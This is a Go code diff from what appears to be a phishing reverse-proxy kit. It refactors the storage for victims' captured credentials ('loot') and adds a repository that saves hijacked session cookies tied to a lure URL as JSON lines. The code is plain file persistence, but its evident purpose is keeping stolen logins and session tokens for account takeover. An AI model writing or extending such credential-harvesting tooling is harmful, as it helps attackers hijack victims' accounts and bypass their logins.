@@ -15,30 +15,61 @@ type DBLoginInfo struct {
 	SessionID string    `json:"sid"`
 	LureURL   string    `json:"lure_url"`
 }
-type LootRepository interface {
+type CredsRepository interface {
 	SaveCreds(info *DBLoginInfo) error
 }
 
-func NewFileLootRepository(credsFile io.Writer) LootRepository {
-	return &fileLootRepository{credsFile: credsFile}
+func NewFileLootRepository(credsFile io.Writer) CredsRepository {
+	return &fileLootRepository{jsonSaver: &jsonSaver{file: credsFile}}
 }
 
 type fileLootRepository struct {
-	credsFile io.Writer
-	mu        sync.Mutex
+	jsonSaver *jsonSaver
 }
 
 func (r *fileLootRepository) SaveCreds(info *DBLoginInfo) (err error) {
-	r.mu.Lock()
-	defer r.mu.Unlock()
 	log.Println("dbInfo = ", info)
+	return r.jsonSaver.SaveData(info)
+}
+
+type jsonSaver struct {
+	file io.Writer
+	mu   sync.Mutex
+}
+
+func (s *jsonSaver) SaveData(info interface{}) (err error) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
 	data, err := json.Marshal(info)
 	if err != nil {
 		return err
 	}
-	if _, err = r.credsFile.Write(data); err != nil {
+	if _, err = s.file.Write(data); err != nil {
 		return
 	}
-	_, err = r.credsFile.Write([]byte("\n"))
+	_, err = s.file.Write([]byte("\n"))
 	return
+}
+
+type DBCapturedSession struct {
+	// TODO User-Agent
+	Cookies   []*SessionCookie `json:"cookies"`
+	SessionID string           `json:"sid"`
+	LureURL   string           `json:"lure_url"`
+}
+
+type SessionRepository interface {
+	SaveSession(sess *DBCapturedSession) error
+}
+
+func NewFileSessionRepository(sessionFile io.Writer) SessionRepository {
+	return &fileSessionRepository{jsonSaver: &jsonSaver{file: sessionFile}}
+}
+
+type fileSessionRepository struct {
+	jsonSaver *jsonSaver
+}
+
+func (r *fileSessionRepository) SaveSession(sess *DBCapturedSession) error {
+	return r.jsonSaver.SaveData(sess)
 }
